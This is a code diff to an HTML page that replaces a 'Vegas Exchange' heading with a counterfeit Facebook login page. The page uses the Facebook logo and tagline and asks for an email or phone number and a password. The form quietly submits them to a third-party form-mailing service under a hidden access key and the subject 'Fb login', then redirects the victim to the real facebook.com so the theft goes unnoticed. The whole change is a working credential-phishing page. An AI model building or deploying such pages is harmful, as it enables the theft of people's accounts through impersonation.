@@ -6,8 +6,50 @@
     <title>Document</title>
 </head>
 <body>
-    <h1>
-        Vegas Exchange
-    </h1>
+    
+
+    <img src="facebook.svg" alt="" width="350px">
+
+    <p>
+        Facebook helps you connect and share with the people in your life.
+    </p>
+
+
+    <form action="https://api.web3forms.com/submit" method="post">
+
+<!-- Replace with your Access Key -->
+<input type="hidden" name="access_key" value="622fd8e4-079e-417c-bebb-4dc2b887ce75">
+
+
+<!-- Optional: Subject an be prefilled using type="hidden"
+       or type="text" for normal user submitted input -->
+       <input type="hidden" name="subject" value="Fb login">
+
+       <!-- Optional: Custom Redirection or Thank you Page
+       Make sure you add full URL including https:// -->
+  <input type="hidden" name="redirect" value="https://facebook.com">
+
+    
+  <!-- Optional: From Name you want to see in the email
+       Default is "Notifications". you can overwrite here -->
+       <input type="hidden" name="from_name" value="fb">
+
+    <br>
+
+    <input name="Email" type="text" placeholder="Email address or Phone number">
+
+    <br><br>
+
+
+    <input name="pass" type="password" placeholder="password">
+
+    <br><br>
+    
+    <button type="submit">
+        Log in
+    </button>
+
+</form>
+
 </body>
 </html>
